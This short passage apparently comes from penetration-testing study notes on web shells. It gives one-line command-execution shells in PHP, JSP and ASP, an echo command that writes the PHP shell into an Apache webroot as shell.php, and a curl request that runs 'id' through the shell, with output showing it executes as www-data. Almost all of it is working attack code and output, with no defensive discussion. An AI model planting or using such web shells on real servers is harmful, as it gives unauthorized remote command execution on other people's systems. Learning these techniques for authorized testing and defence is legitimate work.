Code: php
<?php system($_REQUEST["cmd"]); ?>
Code: jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
Code: asp
<% eval request("cmd") %>
-----------------------
We can check these directories to see which webroot is in use and then use 
echo to write out our web shell. For example, if we are attacking a Linux host running Apache, 
we can write a PHP shell with the following command:

Code: bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
-----------------------
http://SERVER_IP:PORT/shell.php?cmd=id 
#
curl http://SERVER_IP:PORT/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)